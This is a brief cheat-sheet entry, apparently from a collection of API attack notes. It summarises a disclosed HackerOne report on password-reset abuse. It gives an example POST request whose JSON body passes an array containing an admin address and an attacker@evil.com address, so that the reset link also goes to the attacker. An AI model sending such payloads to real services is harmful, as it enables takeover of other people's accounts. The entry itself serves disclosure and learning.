API
===

## Password reset
```
From: https://hackerone.com/reports/322985
The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address.

POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
with body like {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}
```
